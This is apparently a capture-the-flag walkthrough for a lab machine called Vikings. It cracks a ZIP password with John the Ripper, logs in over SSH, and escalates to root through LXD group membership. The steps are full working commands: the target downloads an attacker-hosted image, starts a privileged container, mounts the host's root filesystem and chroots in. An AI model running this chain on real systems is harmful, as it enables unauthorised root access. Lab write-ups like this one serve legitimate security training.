# Walkthrough – Vikings (LXD Privilege Escalation)

## Step 1 – Cracking the Password-Protected ZIP

On the attacker machine:

```bash
# Move into Desktop and locate the zip file
ls ~/Desktop

# Convert the ZIP into a hash John can understand
~/Desktop/john/run/zip2john ~/Desktop/output > hash

# Use rockyou.txt to crack it
~/Desktop/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Result:

```
ragnarok123      (output/king)
```

Confirm with:

```bash
~/Desktop/john/run/john --show hash
```

Output:

```
output/king:ragnarok123:king:output:/home/yumi/Desktop/output
```

Now unzip with the recovered password:

```bash
unzip -P ragnarok123 output
```

---

## Step 2 – Accessing the Target

SSH into the target:

```bash
ssh floki@192.168.56.122
```

Check privileges:

```bash
id
```

Floki is in the `lxd` group → this is exploitable.

---

## Step 3 – Preparing LXD Exploit Image (Attacker Machine)

Clone and build the Alpine image:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

This generates a file like:

```
alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Host it via Python web server:

```bash
python3 -m http.server 80
```

---

## Step 4 – Download Exploit Image on Target (Vikings)

On the target machine:

```bash
wget http://192.168.56.114/alpine-v3.13-x86_64-20210218_0139.tar.gz -O /tmp/alpine.tar.gz
```

Import it into LXC:

```bash
lxc image import /tmp/alpine.tar.gz --alias privesc
lxc image list
```

---

## Step 5 – Initialize LXD

If storage/network not yet configured:

```bash
lxd init
```

Choose defaults but skip networking if it fails.

---

## Step 6 – Launch Privileged Container

```bash
lxc init privesc mycontainer -c security.privileged=true
lxc config device add mycontainer host-root disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Inside container:

```bash
chroot /mnt/root /bin/bash
whoami
# root
```

---

## Step 7 – Loot Flags

```bash
cd /root
cat root.txt
# f0b98d4387ff6da77317e582da98bf31

cd /home/ragnar
cat user.txt
# 4bf930187d0149a9e4374a4e823f867d
```

---

✅ Exploit complete: Root access obtained through **LXD group privilege escalation** after cracking the initial ZIP with **John the Ripper**.
